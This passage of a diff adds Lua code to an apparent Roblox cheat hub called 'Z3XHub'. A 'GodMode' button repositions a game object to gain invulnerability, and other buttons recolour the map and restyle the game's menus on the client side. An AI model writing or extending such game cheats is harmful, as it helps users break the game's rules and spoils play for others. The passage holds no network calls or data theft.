+        MultiChecker.CloseButton.MouseButton1Click:Connect(function()
+            MultiChecker.MultiCheckerGui:Destroy()
+        end)
+    end,
+})
+
+Farm:CreateButton({
+    Name = 'GodMode',
+    Callback = function()
+        task.spawn(function()
+            Players.LocalPlayer.PlayerGui.ScreenGui.QuestTalkBtn.Text = 'Press to activate GodMode'
+            Players.LocalPlayer.PlayerGui.ScreenGui.QuestTalkBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
+            ReplicatedStorage.GhostRiderPart.CFrame = LocalPlayer.Character.HumanoidRootPart.CFrame
+            Players.LocalPlayer.PlayerGui.ScreenGui.QuestMsgFrame:GetPropertyChangedSignal('Visible'):Connect(function()
+                ReplicatedStorage.GhostRiderPart.CFrame = CFrame.new( 147.031021, 249.383453, 1235.40491, 0.00243985653, -0, -0.999997139, 0, 1, -0, 0.999997139, 0, 0.00243985653)
+                task.wait(1)
+                Camera.CameraSubject = LocalPlayer.Character.Humanoid
+                Camera.CameraType = Enum.CameraType.Custom
+                task.wait(.1)
+                LocalPlayer.PlayerGui.ScreenGui.QuestMsgFrame.Visible = false
+                return
+            end)
+        end)
+    end,
+})
+
+
+Visual:CreateButton({
+    Name = 'Better Sky',
+    Callback = function()
+        local Skybox = Instance.new('Sky', Lighting)
+        local skyboxTextures = {
+            SkyboxBk = 'http://www.roblox.com/asset/?id=159454299',
+            SkyboxDn = 'http://www.roblox.com/asset/?id=159454296',
+            SkyboxFt = 'http://www.roblox.com/asset/?id=159454293',
+            SkyboxLf = 'http://www.roblox.com/asset/?id=159454286',
+            SkyboxRt = 'http://www.roblox.com/asset/?id=159454300',
+            SkyboxUp = 'http://www.roblox.com/asset/?id=159454288'
+        }
+        for direction, textureUrl in pairs(skyboxTextures) do
+            Skybox[direction] = textureUrl
+        end
+        Skybox.CelestialBodiesShown = false
+        if Lighting:FindFirstChild('SunRays') then
+            Lighting.SunRays:Destroy()
+        end
+    end,
+})
+
+Visual:CreateButton({
+    Name = 'Black Map',
+    Callback = function()
+        pcall(function()
+            workspace.Terrain.WaterColor = Color3.new(0, 0, 0)
+            workspace.Terrain.WaterTransparency = 0            
+            workspace.Main.TrainingCrystal.Part.Color = Color3.new(0, 0, 0)
+            workspace.Main.TrainingRock.Color = Color3.new(0, 0, 0)
+
+            for _, v in pairs({workspace.Town.Halloween, workspace.Main.GhostRiderCollisionPart, workspace.Main.GrimCollisionPart, workspace.Main.Volcano.DangerSign, workspace.Main.MouseIgnoreGroup.NPCBlockPart1, workspace.Main.MouseIgnoreGroup.NPCBlockPart2, workspace.Main.QuestNPC.Sathopian:FindFirstChild('CuteFoxyBeanie')}) do
+                v:Destroy()
+            end
+
+            for _, v in pairs({workspace.Main.TrainingCrystal.cloud, workspace.Main.TrainingCrystal.CyanGem}) do
+                for _, v2 in pairs(v:GetChildren()) do
+                    if v2:IsA('BasePart') then
+                        v2.BrickColor = BrickColor.new(0, 0, 0)
+                    end
+                end
+            end
+
+            for _, v in pairs({workspace.Main.TrainingArea.StarFSTraining1, workspace.Main.TrainingArea.StarFSTraining2, workspace.Main.TrainingArea.StarFSTraining3}) do
+                for _, v2 in pairs({v.Atmosphere1, v.Atmosphere2}) do
+                    v2.BrickColor = BrickColor.new(0, 0, 0)
+                end
+                for _, v2 in pairs({v.WarnBBGui.TextLabel}) do
+                    v2.Text = 'Z3XHub'
+                end
+            end
+            
+            for _, v in pairs(workspace.Main.Waterfall:GetChildren()) do 
+                if v:IsA('BasePart') then
+                    v.BrickColor = BrickColor.new(0,0,0)
+                    if v.Name == 'Union' then
+                        v.UsePartColor = true
+                    end
+                end
+            end
+
+            for _, v in pairs({workspace.Town.Color.Tree1, workspace.Town.Color.Tree2, workspace.Town.Color.Tree3}) do
+                for _, v2 in pairs(v.Leaf:GetChildren()) do
+                    v2.BrickColor = BrickColor.new(0, 0, 0)
+                end
+                for _, v2 in  pairs(v.Trunk:GetChildren()) do
+                    v2.BrickColor = BrickColor.new(0, 0, 0)
+                end
+            end
+
+            for _, v in pairs({workspace.Main.Volcano}) do
+                for _, v2 in pairs(v:GetChildren()) do
+                    if v2.Name == 'LavaFloor' then
+                        v2.BrickColor = BrickColor.new(0, 0, 0)
+                        v2.UsePartColor = true
+                    end
+                end
+            end
+
+            for _, v in pairs({workspace.Main.Volcano.Parts, workspace.Town.Color.Floor, workspace.Main.TrainingCrystal, workspace.Main.OceanFloor}) do
+                for _, v2 in pairs(v:GetChildren()) do
+                    if v2:IsA('BasePart') then  
+                        v2.BrickColor = BrickColor.new(0, 0, 0)
+                    end
+                end
+            end
+
+            for _, v in pairs({workspace.Main.IceMountain, workspace.Main.Tornado}) do
+                for _, v2 in pairs(v:GetChildren()) do
+                    if v2:IsA('BasePart') then
+                        v2.BrickColor = BrickColor.new(0, 0, 0)
+                    end
+                end
+            end
+
+            for _, v in pairs(workspace.Town.Core:GetDescendants()) do
+                if v:IsA('SpotLight') then
+                    v.Color = Color3.fromRGB(98, 0, 255)
+                    v:GetPropertyChangedSignal('Color'):Connect(function()
+                        v.Color = Color3.fromRGB(98, 0, 255)
+                    end)
+                end
+            end
+        end)
+    end,
+})
+
+Visual:CreateButton({
+    Name = 'Black Menu',
+    Callback = function()
+        pcall(function()
+            local UIStroke = Instance.new('UIStroke')
+            local Corner = Instance.new('UICorner')
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.InvBtn:Destroy()
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.LootBoxBtn:Destroy()
+            LocalPlayer.PlayerGui.ScreenGui.MenuBtn.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.BackgroundTransparency = 1
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.InfoFrame.BackgroundTransparency = 0.1
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.SkillFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.GangFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.SpecialFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.SettingFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.InfoFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.InfoFrame.NameTxt.TextColor3 = Color3.new(255, 255, 255)
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.InfoFrame.RankTxt.TextColor3 = Color3.new(255, 255, 255)
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.InfoFrame.StatusTxt.TextColor3 = Color3.new(255, 255, 255)
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.InfoFrame.KilledTxt.TextColor3 = Color3.new(255, 255, 255)
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.InfoFrame.FSTxt.TextColor3 = Color3.fromRGB(255, 90, 90)
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.InfoFrame.BTTxt.TextColor3 = Color3.fromRGB(252, 93, 61)
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.InfoFrame.PPTxt.TextColor3 = Color3.fromRGB(81, 159, 251)
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.InfoFrame.MSTxt.TextColor3 = Color3.new(255, 255, 255)
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.InfoFrame.JFTxt.TextColor3 = Color3.new(255, 255, 255)
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.InfoFrame.RepTxt.TextColor3 = Color3.new(255, 255, 255)
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.InfoFrame.GuideTxt.TextColor3 = Color3.fromRGB(10, 10, 10)
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.SkillFrame.SkillTxt1.TextColor3 = Color3.new(74, 195, 68)
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.SkillFrame.SkillTxt2.TextColor3 = Color3.new(74, 195, 68)
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.SkillFrame.SkillTxt3.TextColor3 = Color3.new(74, 195, 68)
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.SkillFrame.SkillTxt4.TextColor3 = Color3.new(74, 195, 68)
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.SkillFrame.SkillTxt5.TextColor3 = Color3.new(74, 195, 68)
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.SkillFrame.SkillTxt6.TextColor3 = Color3.new(74, 195, 68)
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.SkillFrame.SkillTxt7.TextColor3 = Color3.new(74, 195, 68)
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.SkillFrame.SkillTxt8.TextColor3 = Color3.new(74, 195, 68)
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.SkillFrame.SkillTxt9.TextColor3 = Color3.new(74, 195, 68)
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.SkillFrame.SkillTxt10.TextColor3 = Color3.new(74, 195, 68)
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.SkillFrame.SkillTxt11.TextColor3 = Color3.new(74, 195, 68)
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.SkillFrame.SkillTxt12.TextColor3 = Color3.new(74, 195, 68)
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.SkillFrame.SkillTxt13.TextColor3 = Color3.new(74, 195, 68)
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.SkillFrame.SkillTxt14.TextColor3 = Color3.new(74, 195, 68)
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.SkillFrame.SkillTxt15.TextColor3 = Color3.new(74, 195, 68)
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.SkillFrame.SkillTxt16.TextColor3 = Color3.new(74, 195, 68)
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.SkillFrame.SkillTxt17.TextColor3 = Color3.new(74, 195, 68)
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.SkillFrame.SkillTxt18.TextColor3 = Color3.new(74, 195, 68)
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.SkillFrame.SkillTxt19.TextColor3 = Color3.new(74, 195, 68)
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.SettingFrame.SettingTxt1.TextColor3 = Color3.new(74, 195, 68)
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.SettingFrame.SettingTxt2.TextColor3 = Color3.new(74, 195, 68)
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.SettingFrame.SettingTxt3.TextColor3 = Color3.new(74, 195, 68)
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.SettingFrame.SettingTxt4.TextColor3 = Color3.new(74, 195, 68)
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.SettingFrame.SettingTxt5.TextColor3 = Color3.new(74, 195, 68)
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.SettingFrame.SettingTxt6.TextColor3 = Color3.new(74, 195, 68)
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.SettingFrame.SettingTxt7.TextColor3 = Color3.new(74, 195, 68)
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.SettingFrame.SettingTxt8.TextColor3 = Color3.new(74, 195, 68)
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.SettingFrame.SettingTxt9.TextColor3 = Color3.new(74, 195, 68)
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.SettingFrame.SettingTxt10.TextColor3 = Color3.new(74, 195, 68)
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.SettingFrame.SettingTxt11.TextColor3 = Color3.new(74, 195, 68)
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.SettingFrame.SettingTxt12.TextColor3 = Color3.new(74, 195, 68)
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.SettingFrame.SettingTxt13.TextColor3 = Color3.new(74, 195, 68)
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.SettingFrame.SettingTxt14.TextColor3 = Color3.new(74, 195, 68)
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.SettingFrame.SettingTxt15.TextColor3 = Color3.new(74, 195, 68)
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.SettingFrame.SettingTxt16.TextColor3 = Color3.new(74, 195, 68)
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.SettingFrame.SettingTxt17.TextColor3 = Color3.new(74, 195, 68)
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.SettingFrame.SettingTxt18.TextColor3 = Color3.new(74, 195, 68)
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.SettingFrame.SettingTxt0.TextColor3 = Color3.new(74, 195, 68)
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.CloseBtn.TextScaled = false
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.CloseBtn.TextColor3 = Color3.fromRGB(10, 10, 10)
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.CloseBtn.TextSize = 33
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.InfoFrame.GuideImg.Visible = false
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.InfoFrame.GuideTxt.Visible = false
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.GangBtn.Visible = false
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.InfoBtn.Size = UDim2.new(0.25, 0, 0.07, 0)
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.SettingBtn.Size = UDim2.new(0.25, 0, 0.07, 0)
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.SkilBtn.Size = UDim2.new(0.25, 0, 0.07, 0)
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.SpecialBtn.Size = UDim2.new(0.25, 0, 0.07, 0)
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.InfoBtn.Position = UDim2.new(0, 0, 0.01, 0)
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.SkilBtn.Position = UDim2.new(0.25, 0, 0.01, 0)
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.SpecialBtn.Position = UDim2.new(0.50, 0, 0.01, 0)
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.SettingBtn.Position = UDim2.new(0.75, 0, 0.01, 0)
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.InfoBtn.Text = 'Stats'
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.SpecialBtn.Text = 'Shop'
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.SkilBtn.Text = 'Skills'
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.SettingBtn.Text = 'Settings'
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.InfoFrame.RankImgBtn.Image = Players:GetUserThumbnailAsync(LocalPlayer.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.InfoFrame.PPMultiplierTxt.Position = UDim2.new(0.75, 0, 0.671774209, 0)
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.InfoFrame.MSMultiplierTxt.Position = UDim2.new(0.75, 0, 0.893548429, 0)
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.InfoFrame.PPUpgradeImgBtn.Position = UDim2.new(0.930000007, 0, 0.674758077, 0)
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.InfoFrame.MSUpgradeImgBtn.Position = UDim2.new(0.930000007, 0, 0.898548424, 0)
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.InfoFrame.Img5.Position = UDim2.new(0.0249999873, 0, 0.663157105, 0)
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.InfoFrame.Img3.Position = UDim2.new(0.0250000004, 0, 0.879999995, 0)
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.InfoFrame.MSTxt.Position = UDim2.new(0.109999999, 0, 0.889999986, 0)
+            LocalPlayer.PlayerGui.ScreenGui.MenuFrame.InfoFrame.PPTxt.Position = UDim2.new(0.109999999, 0, 0.670000017, 0)
+            LocalPlayer.PlayerGui.ScreenGui.MainQuestFrame.RightBtn.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+            LocalPlayer.PlayerGui.ScreenGui.MainQuestFrame.RightBtn.TextColor3 = Color3.new(10, 10, 10)
+            LocalPlayer.PlayerGui.ScreenGui.MainQuestFrame.ScrollBarImageColor3 = Color3.fromRGB(0, 0, 0)
+            LocalPlayer.PlayerGui.ScreenGui.MainQuestFrame.ScrollBarThickness = 12
+            LocalPlayer.PlayerGui.ScreenGui.MainQuestFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+            LocalPlayer.PlayerGui.ScreenGui.MainQuestFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
+            LocalPlayer.PlayerGui.ScreenGui.MainQuestFrame.HeaderTxt1.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+            LocalPlayer.PlayerGui.ScreenGui.MainQuestFrame.HeaderTxt1.TextColor3 = Color3.new(10, 10, 10)
+            LocalPlayer.PlayerGui.ScreenGui.MainQuestFrame.MaxFrame1.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+            LocalPlayer.PlayerGui.ScreenGui.MainQuestFrame.MaxFrame1.RewardTxt.GemImgBtn.ImageColor3 = Color3.fromRGB(0, 0, 0)
+            LocalPlayer.PlayerGui.ScreenGui.MainQuestFrame.MaxFrame1.RewardTxt.GemImgBtn.AmountTxt.TextColor3 = Color3.fromRGB(10, 10, 10)
+            LocalPlayer.PlayerGui.ScreenGui.MainQuestFrame.MaxFrame1.RewardTxt.GemImgBtn.AmountTxt.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+            LocalPlayer.PlayerGui.ScreenGui.MainQuestFrame.MaxFrame2.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+            LocalPlayer.PlayerGui.ScreenGui.MainQuestFrame.MaxFrame2.RewardTxt.GemImgBtn.ImageColor3 = Color3.fromRGB(0, 0, 0)
+            LocalPlayer.PlayerGui.ScreenGui.MainQuestFrame.MaxFrame2.RewardTxt.GemImgBtn.AmountTxt.TextColor3 = Color3.fromRGB(10, 10, 10)
+            LocalPlayer.PlayerGui.ScreenGui.MainQuestFrame.MaxFrame2.RewardTxt.GemImgBtn.AmountTxt.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+            LocalPlayer.PlayerGui.ScreenGui.MainQuestFrame.MaxFrame3.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+            LocalPlayer.PlayerGui.ScreenGui.MainQuestFrame.MaxFrame3.RewardTxt.GemImgBtn.ImageColor3 = Color3.fromRGB(0, 0, 0)
+            LocalPlayer.PlayerGui.ScreenGui.MainQuestFrame.MaxFrame3.RewardTxt.GemImgBtn.AmountTxt.TextColor3 = Color3.fromRGB(10, 10, 10)
+            LocalPlayer.PlayerGui.ScreenGui.MainQuestFrame.MaxFrame3.RewardTxt.GemImgBtn.AmountTxt.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+            LocalPlayer.PlayerGui.ScreenGui.MainQuestFrame.MaxFrame4.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+            LocalPlayer.PlayerGui.ScreenGui.MainQuestFrame.MaxFrame4.RewardTxt.GemImgBtn.ImageColor3 = Color3.fromRGB(0, 0, 0)
+            LocalPlayer.PlayerGui.ScreenGui.MainQuestFrame.MaxFrame4.RewardTxt.GemImgBtn.AmountTxt.TextColor3 = Color3.fromRGB(10, 10, 10)
+            LocalPlayer.PlayerGui.ScreenGui.MainQuestFrame.MaxFrame4.RewardTxt.GemImgBtn.AmountTxt.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+            LocalPlayer.PlayerGui.ScreenGui.MainQuestFrame.MaxFrame5.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+            LocalPlayer.PlayerGui.ScreenGui.MainQuestFrame.MaxFrame5.RewardTxt.GemImgBtn.ImageColor3 = Color3.fromRGB(0, 0, 0)
+            LocalPlayer.PlayerGui.ScreenGui.MainQuestFrame.MaxFrame5.RewardTxt.GemImgBtn.AmountTxt.TextColor3 = Color3.fromRGB(10, 10, 10)
+            LocalPlayer.PlayerGui.ScreenGui.MainQuestFrame.MaxFrame5.RewardTxt.GemImgBtn.AmountTxt.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+            LocalPlayer.PlayerGui.ScreenGui.DailyQuestFrame.RightBtn.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+            LocalPlayer.PlayerGui.ScreenGui.DailyQuestFrame.LeftBtn.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+            LocalPlayer.PlayerGui.ScreenGui.DailyQuestFrame.ScrollBarImageColor3 = Color3.fromRGB(0, 0, 0)
+            LocalPlayer.PlayerGui.ScreenGui.DailyQuestFrame.ScrollBarThickness = 12
+            LocalPlayer.PlayerGui.ScreenGui.DailyQuestFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+            LocalPlayer.PlayerGui.ScreenGui.DailyQuestFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
+            LocalPlayer.PlayerGui.ScreenGui.DailyQuestFrame.HeaderTxt1.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+            LocalPlayer.PlayerGui.ScreenGui.DailyQuestFrame.MaxFrame1.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+            LocalPlayer.PlayerGui.ScreenGui.DailyQuestFrame.MaxFrame1.RewardTxt.GemImgBtn.ImageColor3 = Color3.fromRGB(0, 0, 0)
+            LocalPlayer.PlayerGui.ScreenGui.DailyQuestFrame.MaxFrame1.RewardTxt.GemImgBtn.AmountTxt.TextColor3 = Color3.fromRGB(10, 10, 10)
+            LocalPlayer.PlayerGui.ScreenGui.DailyQuestFrame.MaxFrame1.RewardTxt.GemImgBtn.AmountTxt.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+            LocalPlayer.PlayerGui.ScreenGui.DailyQuestFrame.MaxFrame2.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+            LocalPlayer.PlayerGui.ScreenGui.DailyQuestFrame.MaxFrame2.RewardTxt.GemImgBtn.ImageColor3 = Color3.fromRGB(0, 0, 0)
+            LocalPlayer.PlayerGui.ScreenGui.DailyQuestFrame.MaxFrame2.RewardTxt.GemImgBtn.AmountTxt.TextColor3 = Color3.fromRGB(10, 10, 10)
+            LocalPlayer.PlayerGui.ScreenGui.DailyQuestFrame.MaxFrame2.RewardTxt.GemImgBtn.AmountTxt.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+            LocalPlayer.PlayerGui.ScreenGui.DailyQuestFrame.MaxFrame3.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+            LocalPlayer.PlayerGui.ScreenGui.DailyQuestFrame.MaxFrame3.RewardTxt.GemImgBtn.ImageColor3 = Color3.fromRGB(0, 0, 0)
+            LocalPlayer.PlayerGui.ScreenGui.DailyQuestFrame.MaxFrame3.RewardTxt.GemImgBtn.AmountTxt.TextColor3 = Color3.fromRGB(10, 10, 10)
+            LocalPlayer.PlayerGui.ScreenGui.DailyQuestFrame.MaxFrame3.RewardTxt.GemImgBtn.AmountTxt.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+            LocalPlayer.PlayerGui.ScreenGui.DailyQuestFrame.MaxFrame4.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+            LocalPlayer.PlayerGui.ScreenGui.DailyQuestFrame.MaxFrame4.RewardTxt.GemImgBtn.ImageColor3 = Color3.fromRGB(0, 0, 0)
+            LocalPlayer.PlayerGui.ScreenGui.DailyQuestFrame.MaxFrame4.RewardTxt.GemImgBtn.AmountTxt.TextColor3 = Color3.fromRGB(10, 10, 10)
+            LocalPlayer.PlayerGui.ScreenGui.DailyQuestFrame.MaxFrame4.RewardTxt.GemImgBtn.AmountTxt.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+            LocalPlayer.PlayerGui.ScreenGui.DailyQuestFrame.MaxFrame5.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+            LocalPlayer.PlayerGui.ScreenGui.DailyQuestFrame.MaxFrame5.RewardTxt.GemImgBtn.ImageColor3 = Color3.fromRGB(0, 0, 0)
+            LocalPlayer.PlayerGui.ScreenGui.DailyQuestFrame.MaxFrame5.RewardTxt.GemImgBtn.AmountTxt.TextColor3 = Color3.fromRGB(10, 10, 10)
+            LocalPlayer.PlayerGui.ScreenGui.DailyQuestFrame.MaxFrame5.RewardTxt.GemImgBtn.AmountTxt.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+            LocalPlayer.PlayerGui.ScreenGui.SpecialQuestFrame.RightBtn.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+            LocalPlayer.PlayerGui.ScreenGui.SpecialQuestFrame.LeftBtn.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+            LocalPlayer.PlayerGui.ScreenGui.SpecialQuestFrame.ScrollBarImageColor3 = Color3.fromRGB(0, 0, 0)
+            LocalPlayer.PlayerGui.ScreenGui.SpecialQuestFrame.ScrollBarThickness = 12
+            LocalPlayer.PlayerGui.ScreenGui.SpecialQuestFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+            LocalPlayer.PlayerGui.ScreenGui.SpecialQuestFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
+            LocalPlayer.PlayerGui.ScreenGui.SpecialQuestFrame.HeaderTxt1.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+            LocalPlayer.PlayerGui.ScreenGui.SpecialQuestFrame.HeaderTxt1.TextColor3 = Color3.fromRGB(0, 0, 0)
+            LocalPlayer.PlayerGui.ScreenGui.SpecialQuestFrame.MaxFrame1.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+            LocalPlayer.PlayerGui.ScreenGui.SpecialQuestFrame.MaxFrame1.RewardTxt.GemImgBtn.ImageColor3 = Color3.fromRGB(0, 0, 0)
+            LocalPlayer.PlayerGui.ScreenGui.SpecialQuestFrame.MaxFrame1.RewardTxt.GemImgBtn.AmountTxt.TextColor3 = Color3.fromRGB(10, 10, 10)
+            LocalPlayer.PlayerGui.ScreenGui.SpecialQuestFrame.MaxFrame1.RewardTxt.GemImgBtn.AmountTxt.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+            LocalPlayer.PlayerGui.ScreenGui.SpecialQuestFrame.MaxFrame2.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+            LocalPlayer.PlayerGui.ScreenGui.SpecialQuestFrame.MaxFrame2.RewardTxt.GemImgBtn.ImageColor3 = Color3.fromRGB(0, 0, 0)
+            LocalPlayer.PlayerGui.ScreenGui.SpecialQuestFrame.MaxFrame2.RewardTxt.GemImgBtn.AmountTxt.TextColor3 = Color3.fromRGB(10, 10, 10)
+            LocalPlayer.PlayerGui.ScreenGui.SpecialQuestFrame.MaxFrame2.RewardTxt.GemImgBtn.AmountTxt.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+            LocalPlayer.PlayerGui.ScreenGui.SpecialQuestFrame.MaxFrame3.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+            LocalPlayer.PlayerGui.ScreenGui.SpecialQuestFrame.MaxFrame3.RewardTxt.GemImgBtn.ImageColor3 = Color3.fromRGB(0, 0, 0)
+            LocalPlayer.PlayerGui.ScreenGui.SpecialQuestFrame.MaxFrame3.RewardTxt.GemImgBtn.AmountTxt.TextColor3 = Color3.fromRGB(10, 10, 10)
+            LocalPlayer.PlayerGui.ScreenGui.SpecialQuestFrame.MaxFrame3.RewardTxt.GemImgBtn.AmountTxt.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+            LocalPlayer.PlayerGui.ScreenGui.SpecialQuestFrame.MaxFrame4.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+            LocalPlayer.PlayerGui.ScreenGui.SpecialQuestFrame.MaxFrame4.RewardTxt.GemImgBtn.ImageColor3 = Color3.fromRGB(0, 0, 0)
+            LocalPlayer.PlayerGui.ScreenGui.SpecialQuestFrame.MaxFrame4.RewardTxt.GemImgBtn.AmountTxt.TextColor3 = Color3.fromRGB(10, 10, 10)
+            LocalPlayer.PlayerGui.ScreenGui.SpecialQuestFrame.MaxFrame4.RewardTxt.GemImgBtn.AmountTxt.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+            LocalPlayer.PlayerGui.ScreenGui.SpecialQuestFrame.MaxFrame5.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+            LocalPlayer.PlayerGui.ScreenGui.SpecialQuestFrame.MaxFrame5.RewardTxt.GemImgBtn.ImageColor3 = Color3.fromRGB(0, 0, 0)
+            LocalPlayer.PlayerGui.ScreenGui.SpecialQuestFrame.MaxFrame5.RewardTxt.GemImgBtn.AmountTxt.TextColor3 = Color3.fromRGB(10, 10, 10)
+            LocalPlayer.PlayerGui.ScreenGui.SpecialQuestFrame.MaxFrame5.RewardTxt.GemImgBtn.AmountTxt.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+            LocalPlayer.PlayerGui.ScreenGui.WeeklyQuestFrame.LeftBtn.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
